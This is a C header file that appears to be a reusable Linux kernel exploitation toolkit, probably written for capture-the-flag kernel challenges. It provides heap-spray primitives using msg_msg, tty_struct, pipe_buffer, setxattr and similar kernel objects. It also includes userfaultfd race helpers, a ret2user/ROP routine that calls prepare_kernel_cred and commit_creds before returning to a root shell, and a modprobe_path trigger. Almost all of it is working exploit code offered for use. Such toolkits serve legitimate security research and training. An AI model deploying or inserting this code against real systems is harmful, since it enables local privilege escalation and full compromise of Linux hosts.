#ifndef __KUTIL_H__
#define __KUTIL_H__

#define ENABLE_LDT_STRUCT
#define ENABLE_SEQ_OPERATIONS
#define ENABLE_SHM_FILE_DATA
#define ENABLE_TIMERFD_CTX
#define ENABLE_TTY_STRUCT
#define ENABLE_PIPE_BUFFER
#define ENABLE_MSG_MSG
#define ENABLE_SETXATTR
#define ENABLE_SK_BUFF
#define ENABLE_ROP
#define ENABLE_USERFAULTFD
#define ENABLE_MODPROBE_PATH
#define ENABLE_LOCK_CPU
#define ENABLE_COMM
#define ENABLE_DUMP

#define PAGE_SIZE 0x1000

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define ABORT(msg)                                                             \
  do {                                                                         \
    fprintf(stderr, "[%s] %s: %s\n", __func__, msg, strerror(errno));          \
    exit(EXIT_FAILURE);                                                        \
  } while (0)

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_LDT_STRUCT
#include <asm/ldt.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#define CMD_READ_LDT 0
#define CMD_WRITE_LDT 1

void kmalloc16_ldt_struct() {
  struct user_desc desc;
  desc.base_addr = 0;
  desc.entry_number = 0;
  desc.limit = 0;
  desc.seg_32bit = 0;
  desc.contents = 0;
  desc.limit_in_pages = 0;
  desc.lm = 0;
  desc.read_exec_only = 0;
  desc.seg_not_present = 0;
  desc.useable = 0;

  int err = syscall(SYS_modify_ldt, CMD_WRITE_LDT, &desc, sizeof(desc));
  if (err == -1) {
    ABORT("syscall");
  }
}

int read_ldt_struct(char *buf, size_t size) {
  int err = syscall(SYS_modify_ldt, 0, buf, size);
  if (err == -1) {
    switch (errno) {
    case EFAULT:
      return -1;
    default:
      ABORT("syscall");
    }
  }

  return 0;
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_SEQ_OPERATIONS
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int kmalloc32_seq_operations() {
  int fd = open("/proc/self/stat", O_RDONLY);
  if (fd == -1) {
    ABORT("open");
  }

  return fd;
}

void kfree_seq_operations(int fd) { close(fd); }
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_SHM_FILE_DATA
#include <sys/ipc.h>
#include <sys/shm.h>

int kmalloc32_shm_file_data() {
  int id = shmget(IPC_PRIVATE, PAGE_SIZE, 0600);
  if (id == -1) {
    ABORT("shmget");
  }

  void *addr = shmat(id, NULL, 0);
  if (addr == (void *)-1) {
    ABORT("shmat");
  }

  return id;
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_TIMERFD_CTX
#include <sys/timerfd.h>
#include <unistd.h>

int kmalloc256_timerfd_ctx() {
  int fd = timerfd_create(CLOCK_REALTIME, 0);
  if (fd == -1) {
    ABORT("timerfd_create");
  }

  struct itimerspec timerspec = {{0, 0}, {100, 0}};
  if (timerfd_settime(fd, 0, &timerspec, NULL) == -1) {
    ABORT("timerfd_settime");
  }

  return fd;
}

void kfree_timerfd_ctx(int fd) {
  close(fd);
  sleep(1);
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_TTY_STRUCT
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int kmalloc1024_tty_struct() {
  int fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
  if (fd == -1) {
    ABORT("open");
  }

  return fd;
}

void kfree_tty_struct(int fd) { close(fd); }
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_PIPE_BUFFER
#include <unistd.h>

void kmalloc1024_pipe_buffer(int pair[2]) {
  if (pipe(pair) == -1) {
    ABORT("pipe");
  }

  ssize_t n = write(pair[1], "pipe", 5);
  if (n == -1 || n != 5) {
    ABORT("write");
  }
}

void kfree_pipe_buffer(int pair[2]) {
  close(pair[0]);
  close(pair[1]);
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_MSG_MSG
#ifndef __USE_GNU
#define __USE_GNU
#endif

#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>

#define MSG_COPY 040000
#define HDRLEN_MSG 0x30
#define HDRLEN_MSGSEG 0x08
#define MTEXTLEN_MSG(size) ((size)-HDRLEN_MSG)
#define MTEXTLEN_MSGSEG(size) ((size) + PAGE_SIZE - HDRLEN_MSG - HDRLEN_MSGSEG)

#define MTYPE_DEFAULT 1

struct msgbuf *__new_msgbuf(long mtype, size_t size, char *mtext) {
  struct msgbuf *msgbuf = (struct msgbuf *)malloc(sizeof(long) + size);
  if (!msgbuf) {
    ABORT("malloc");
  }

  msgbuf->mtype = mtype;
  if (!mtext) {
    memset(msgbuf->mtext, 0x58, size);
  } else {
    memcpy(msgbuf->mtext, mtext, size);
  }

  return msgbuf;
}

int msgid() {
  int msgid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if (msgid == -1) {
    ABORT("msgget");
  }

  return msgid;
}

void __kmalloc_msg(int msgid, size_t size, struct msgbuf *msgbuf) {
  int err = msgsnd(msgid, msgbuf, size, IPC_NOWAIT);
  if (err == -1) {
    ABORT("msgsnd");
  }
}

struct msgbuf *__kfree_msg(int msgid, size_t size) {
  struct msgbuf *msgbuf = __new_msgbuf(MTYPE_DEFAULT, size, NULL);
  int n = msgrcv(msgid, msgbuf, size, 0, IPC_NOWAIT);
  if (n == -1 || n != size) {
    ABORT("msgrcv");
  }

  return msgbuf;
}

struct msgbuf *__peek_msg(int msgid, size_t size) {
  struct msgbuf *msgbuf = __new_msgbuf(MTYPE_DEFAULT, size, NULL);
  int n = msgrcv(msgid, msgbuf, size, 0, MSG_COPY | IPC_NOWAIT);
  if (n == -1 || n != size) {
    ABORT("msgrcv");
  }

  return msgbuf;
}

void kmalloc_msg(int msgid, size_t size, char *mtext) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSG);

  struct msgbuf *msgbuf =
      __new_msgbuf(MTYPE_DEFAULT, MTEXTLEN_MSG(size), mtext);

  __kmalloc_msg(msgid, MTEXTLEN_MSG(size), msgbuf);
  free(msgbuf);
}

void kmalloc_msgseg(int msgid, size_t size, char *mtext) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSGSEG);

  struct msgbuf *msgbuf =
      __new_msgbuf(MTYPE_DEFAULT, MTEXTLEN_MSGSEG(size), NULL);

  if (mtext) {
    memcpy(msgbuf->mtext + PAGE_SIZE - HDRLEN_MSG, mtext, size - HDRLEN_MSGSEG);
  }

  __kmalloc_msg(msgid, MTEXTLEN_MSGSEG(size), msgbuf);
  free(msgbuf);
}

char *kfree_msg(int msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSG);

  struct msgbuf *msgbuf = __kfree_msg(msgid, MTEXTLEN_MSG(size));
  char *mtext = (char *)malloc(size);
  if (!mtext) {
    ABORT("malloc");
  }

  memcpy(mtext, msgbuf->mtext, size - HDRLEN_MSG);
  free(msgbuf);
  return mtext;
}

char *kfree_msgseg(int msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSGSEG);

  struct msgbuf *msgbuf = __kfree_msg(msgid, MTEXTLEN_MSGSEG(size));
  char *mtext = (char *)malloc(size);
  if (!mtext) {
    ABORT("malloc");
  }

  memcpy(mtext, msgbuf->mtext + PAGE_SIZE - HDRLEN_MSG, size - HDRLEN_MSGSEG);
  free(msgbuf);
  return mtext;
}

char *peek_msg(int msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSG);

  struct msgbuf *msgbuf = __peek_msg(msgid, MTEXTLEN_MSG(size));
  char *mtext = (char *)malloc(size);
  if (!mtext) {
    ABORT("malloc");
  }

  memcpy(mtext, msgbuf->mtext, size - HDRLEN_MSG);
  free(msgbuf);
  return mtext;
}

char *peek_msgseg(int msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSGSEG);

  struct msgbuf *msgbuf = __peek_msg(msgid, MTEXTLEN_MSGSEG(size));
  char *mtext = (char *)malloc(size);
  if (!mtext) {
    ABORT("malloc");
  }

  memcpy(mtext, msgbuf->mtext + PAGE_SIZE - HDRLEN_MSG, size - HDRLEN_MSGSEG);
  free(msgbuf);
  return mtext;
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_SETXATTR
#include <errno.h>
#include <limits.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/xattr.h>

#ifndef KMALLOC_SETXATTR_PATH
#define KMALLOC_SETXATTR_PATH "/tmp/setxattr_%d"
#endif

#ifndef KMALLOC_SETXATTR_KEY
#define KMALLOC_SETXATTR_KEY "ceb32713a5d2d2ca"
#endif

int kmalloc_setxattr_counter = 0;

void kmalloc_setxattr(size_t size, char *buf) {
  char path[PATH_MAX];
  snprintf(path, PATH_MAX, KMALLOC_SETXATTR_PATH, kmalloc_setxattr_counter++);

  FILE *fp = fopen(path, "w");
  if (!fp) {
    ABORT("fopen");
  }
  fclose(fp);

  int err = setxattr(path, KMALLOC_SETXATTR_KEY, buf, size, XATTR_CREATE);
  if (err == -1) {
    switch (errno) {
    case EOPNOTSUPP:
      break;
    default:
      ABORT("setxattr");
    }
  }
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_SK_BUFF
#include <assert.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define SKB_SHARED_INFO_SIZE 0x140

void kmalloc_sk_buff(int pair[2], size_t size, char *data) {
  assert(size >= SKB_SHARED_INFO_SIZE);

  int err = socketpair(AF_UNIX, SOCK_STREAM, 0, pair);
  if (err == -1) {
    ABORT("socketpair");
  }

  ssize_t n = write(pair[0], data, size - SKB_SHARED_INFO_SIZE);
  if (n == -1 || n != size - SKB_SHARED_INFO_SIZE) {
    ABORT("write");
  }
}

char *kfree_sk_buff(int pair[2], size_t size) {
  assert(size >= SKB_SHARED_INFO_SIZE);

  char *data = (char *)malloc(size);
  if (!data) {
    ABORT("malloc");
  }

  ssize_t n = read(pair[1], data, size - SKB_SHARED_INFO_SIZE);
  if (n == -1 || n != size - SKB_SHARED_INFO_SIZE) {
    ABORT("write");
  }

  return data;
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_ROP
#include <unistd.h>

void shell() {
  char *path = "/bin/sh";
  char *argv[] = {path, NULL};
  char *envp[] = {NULL};
  execve(path, argv, envp);
}

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;
unsigned long user_ip = (unsigned long)shell;

void save_state() {
  asm(".intel_syntax noprefix;"
      "mov user_cs, cs;"
      "mov user_ss, ss;"
      "mov user_sp, rsp;"
      "pushf;"
      "pop user_rflags;"
      ".att_syntax;");
}

unsigned long prepare_kernel_cred;
unsigned long commit_creds;
unsigned long swapgs_restore_regs_and_return_to_usermode_0x16;

void ret2user() {
  if (swapgs_restore_regs_and_return_to_usermode_0x16) {
    asm(".intel_syntax noprefix;"
        "mov rax, prepare_kernel_cred;"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "mov rax, commit_creds;"
        "call rax;"
        "mov rax, user_ss;"
        "push rax;"
        "mov rax, user_sp;"
        "push rax;"
        "mov rax, user_rflags;"
        "push rax;"
        "mov rax, user_cs;"
        "push rax;"
        "mov rax, user_ip;"
        "push rax;"
        "mov rax, 0;"
        "push rax;"
        "mov rax, swapgs_restore_regs_and_return_to_usermode_0x16;"
        "call rax;"
        ".att_syntax;");
  } else {
    asm(".intel_syntax noprefix;"
        "mov rax, prepare_kernel_cred;"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "mov rax, commit_creds;"
        "call rax;"
        "swapgs;"
        "mov rax, user_ss;"
        "push rax;"
        "mov rax, user_sp;"
        "push rax;"
        "mov rax, user_rflags;"
        "push rax;"
        "mov rax, user_cs;"
        "push rax;"
        "mov rax, user_ip;"
        "push rax;"
        "iretq;"
        ".att_syntax;");
  }
}

void rop_iretq(unsigned long *p) {
  *p++ = user_ip;
  *p++ = user_cs;
  *p++ = user_rflags;
  *p++ = user_sp;
  *p++ = user_ss;
}

void rop_swapgs_restore_regs_and_return_to_usermode(unsigned long *p) {
  *p++ = swapgs_restore_regs_and_return_to_usermode_0x16;
  *p++ = -1;
  *p++ = -1;
  rop_iretq(p);
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_USERFAULTFD
#include <assert.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

int userfaultfd() {
  int fd = syscall(__NR_userfaultfd, O_CLOEXEC);
  if (fd == -1) {
    ABORT("syscall");
  }

  struct uffdio_api uffdio_api;
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  int err = ioctl(fd, UFFDIO_API, &uffdio_api);
  if (err == -1) {
    ABORT("ioctl");
  }

  return fd;
}

void userfaultfd_register(int fd, void *start, size_t len) {
  assert(((unsigned long)start) % PAGE_SIZE == 0);
  assert(len % PAGE_SIZE == 0);

  struct uffdio_register uffdio_register;
  uffdio_register.range.start = (unsigned long)start;
  uffdio_register.range.len = len;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  int err = ioctl(fd, UFFDIO_REGISTER, &uffdio_register);
  if (err == -1) {
    ABORT("ioctl");
  }
}

void userfaultfd_copy(int fd, void *dst, void *src) {
  assert(((unsigned long)dst) % PAGE_SIZE == 0);

  struct uffdio_copy uffdio_copy;
  uffdio_copy.src = (unsigned long)src;
  uffdio_copy.dst = (unsigned long)dst;
  uffdio_copy.len = PAGE_SIZE;
  uffdio_copy.mode = 0;
  uffdio_copy.copy = 0;
  int err = ioctl(fd, UFFDIO_COPY, &uffdio_copy);
  if (err == -1) {
    ABORT("ioctl");
  }
}

struct uffd_msg *userfaultfd_wait(int fd) {
  struct uffd_msg *uffd_msg =
      (struct uffd_msg *)malloc(sizeof(struct uffd_msg));
  if (!uffd_msg) {
    ABORT("malloc");
  }

  ssize_t n = read(fd, uffd_msg, sizeof(struct uffd_msg));
  if (n == -1) {
    ABORT("read");
  }

  assert(n == sizeof(struct uffd_msg));
  assert(uffd_msg->event == UFFD_EVENT_PAGEFAULT);

  return uffd_msg;
}

void reenable_userfault(void *addr, size_t length) {
  assert(((unsigned long)addr) % PAGE_SIZE == 0);
  assert(length % PAGE_SIZE == 0);

  int err = madvise(addr, length, MADV_DONTNEED);
  if (err == -1) {
    ABORT("madvise");
  }
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_MODPROBE_PATH
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EXEC_MODPROBE_PATH_FILE "/tmp/trigger"

void prepare_script(char *path, char *contents) {
  FILE *fp = fopen(path, "w");
  if (!fp) {
    ABORT("fopen");
  }

  size_t len = strlen(contents);
  size_t n = fwrite(contents, 1, len, fp);

  if (n < len) {
    ABORT("fwrite");
  }

  fclose(fp);

  int err = chmod(path, S_IXUSR);
  if (err == -1) {
    ABORT("chmod");
  }
}

void exec_modprobe_path(char *path) {
  if (!path) {
    path = EXEC_MODPROBE_PATH_FILE;
  }

  char magic[] = {0xff, 0xff, 0xff, 0xff, 0x00};
  prepare_script(path, magic);

  char *argv[] = {path, NULL};
  char *envp[] = {NULL};
  int err = execve(path, argv, envp);
  if (err == -1) {
    switch (errno) {
    case ENOEXEC:
      break;
    default:
      ABORT("execve");
    }
  } else {
    ABORT("execve");
  }
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_LOCK_CPU
#ifndef __USE_GNU
#define __USE_GNU
#endif

#include <sched.h>

void lock_cpu() {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(0, &cpu_set);
  int err = sched_setaffinity(0, sizeof(cpu_set), &cpu_set);
  if (err == -1) {
    ABORT("sched_setaffinity");
  }
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_COMM
#include <sys/prctl.h>

void set_comm(char *name) {
  int err = prctl(PR_SET_NAME, name);
  if (err == -1) {
    ABORT("prctl");
  }
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef ENABLE_DUMP
#include <stdio.h>

void stop() { getchar(); }

void dump(unsigned char *p, size_t len) {
  size_t i;
  for (i = 0; i + 16 <= len; i += 16) {
    printf("[%08zx] ", i);

    size_t j;
    for (j = 0; j < 16; j++) {
      printf("%02x", p[i + j]);
    }

    printf(" ");
    printf("%016lx %016lx", ((unsigned long *)&p[i])[0],
           ((unsigned long *)&p[i])[1]);

    printf(" ");
    for (j = 0; j < 16; j++) {
      printf("%c", p[i + j]);
    }

    printf("\n");
  }

  if (i < len) {
    printf("[%08zx] ", i);

    for (; i < len; i++) {
      printf("%02x", p[i]);
    }

    printf("\n");
  }
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#endif
